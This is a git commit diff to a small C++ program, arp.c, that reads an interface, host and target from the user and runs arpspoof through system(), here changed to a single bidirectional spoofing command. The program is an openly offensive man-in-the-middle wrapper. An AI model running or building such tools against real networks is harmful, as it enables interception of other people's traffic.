f6c3b90a00718fc7095ddb6afb083577f6fcdc81
Jason9477 <55344688+Jason9477@users.noreply.github.com>
2020-01-01 01:08:10 +0800

    Update arp.c

--- arp.c
+++ arp.c
@@ -4,21 +4,17 @@
 #include<string.h>
 using namespace std;
 int main(){
-	string wir,host,ip,arp1,arp2;
+	string wir,host,ip,arp1;
 	cout<<"wireless card:";
 	cin>>wir;
 	cout<<"host:";
 	cin>>host;
 	cout<<"target:";
 	cin>>ip;
-	arp1="arpspoof -i "+wir+" -t "+host+" "+ip+"&";
-	arp2="arpspoof -i "+wir+" -t "+ip+" "+host+"&";
+	arp1="arpspoof -i "+wir+" -c both "+" -t "+host+" "+ip;
 	char cstr[arp1.size() + 1];
     strcpy(cstr, arp1.c_str());
-   	char cstr2[arp2.size() + 1];
-    strcpy(cstr2, arp2.c_str());
 	system(cstr);
-	system(cstr2);
 	return 0;
 }
  
